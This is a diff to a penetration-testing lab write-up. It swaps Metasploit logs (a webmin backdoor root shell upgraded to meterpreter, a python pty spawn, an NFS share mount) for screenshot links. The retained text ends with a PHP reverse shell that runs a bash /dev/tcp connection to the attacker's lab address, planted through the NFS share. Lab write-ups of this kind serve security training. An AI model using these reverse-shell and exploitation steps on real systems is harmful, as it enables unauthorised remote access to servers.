@@ -45,127 +45,28 @@
 - This gives us a root shell on the server, granted not the best shell in the world
 
 #### Upgrading the shell
+- To make this shell more usable we can utilise the metasploit feature meterpreter shell
 
-- To make this shell more usable we can utilise the metsploit feature meterperter shell
-
-```
-^Z
-Background session 2? [y/N]  y
-msf6 exploit(linux/http/webmin_backdoor) > search shell_to_meterpreter
-
-Matching Modules
-================
-
-   #  Name                                    Disclosure Date  Rank    Check  Description
-   -  ----                                    ---------------  ----    -----  -----------
-   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
-
-
-Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
-
-msf6 exploit(linux/http/webmin_backdoor) > use 0
-```
-
-```
-msf6 post(multi/manage/shell_to_meterpreter) > show options
-
-Module options (post/multi/manage/shell_to_meterpreter):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
-   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
-   LPORT    4433             yes       Port for payload to connect to.
-   SESSION                   yes       The session to run this module on
-
-
-View the full module info with the info, or info -d command.
-
-msf6 post(multi/manage/shell_to_meterpreter) > sessions -l
-
-Active sessions
-===============
-
-  Id  Name  Type            Information  Connection
-  --  ----  ----            -----------  ----------
-  1         shell cmd/unix               10.1.26.20:4444 -> 10.1.26.30:52472 (10.1.26.30)
-  2         shell cmd/unix               10.1.26.20:4444 -> 10.1.26.30:52474 (10.1.26.30)
-
-msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 2
-SESSION => 2
-msf6 post(multi/manage/shell_to_meterpreter) > run
-
-[*] Upgrading session ID: 2
-[*] Starting exploit/multi/handler
-[*] Started reverse TCP handler on 10.1.26.20:4433
-[*] Sending stage (1017704 bytes) to 10.1.26.30
-[*] Meterpreter session 3 opened (10.1.26.20:4433 -> 10.1.26.30:51376) at 2023-03-06 13:58:30 +0000
-[*] Command stager progress: 100.00% (773/773 bytes)
-[*] Post module execution completed
-```
-
-```
-msf6 post(multi/manage/shell_to_meterpreter) > sessions -l
-
-Active sessions
-===============
-
-  Id  Name  Type                   Information            Connection
-  --  ----  ----                   -----------            ----------
-  1         shell cmd/unix                                10.1.26.20:4444 -> 10.1.26.30:52472 (10.1.26.30)
-  2         shell cmd/unix                                10.1.26.20:4444 -> 10.1.26.30:52474 (10.1.26.30)
-  3         meterpreter x86/linux  root @ 192.168.130.34  10.1.26.20:4433 -> 10.1.26.30:51376 (10.1.26.30)
-
-msf6 post(multi/manage/shell_to_meterpreter) > sessions 3
-[*] Starting interaction with 3...
-
-meterpreter >
-```
+![[meterpreter-shell.png]]
 
 - We now have a meterpreter shell!
 - Running sysinfo shows us we have a Ubuntu 16.04 box running with an old linux kernel - this could open some doors for a kernel exploit priv esc
 - Also note we arent on amd64 we are on i686 which is 32bit - this could pose a problem for compiling some of our exploits
 
-```
-meterpreter > sysinfo
-Computer     : 192.168.130.34
-OS           : Ubuntu 16.04 (Linux 4.4.0-210-generic)
-Architecture : i686
-BuildTuple   : i486-linux-musl
-Meterpreter  : x86/linux
-meterpreter >
-```
+![[sysinfo.png]]
 
 - we can upgrade our shell further by using the python pty library
 - and export TERM=xterm will give you the ability to clear the screen
-```
-meterpreter > shell
-Process 32222 created.
-Channel 2 created.
-python -c 'import pty; pty.spawn("/bin/bash")'
-root@srv-99-590:/usr/share/webmin#
-```
+![[python-pty.png]]
 
 - This webmin exploit also allows us to log directly in as root
 
 ### Method 2 - NFS
 
-- We can mount the nfs share and acces the files on the webserver
-
-```
-┌──(kali㉿kali-99-590)-[~]
-└─$ sudo mount -t nfs 10.1.26.30:/ /mnt/nfs -o nolock 
-┌──(kali㉿kali-99-590)-[~]
-└─$ tree /mnt/nfs
-/mnt/nfs
-└── var
-    └── www
-        └── html
-            └── index.html
-```
+- We can mount the nfs share we discovered during the nmap and acces the files on the webserver
+![[mount-nfs.png]]
 
 - We can then upload a php reverse shell to the webserver into /var/www/html
-
 ```php
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/10.1.26.20/1234 0>&1'");
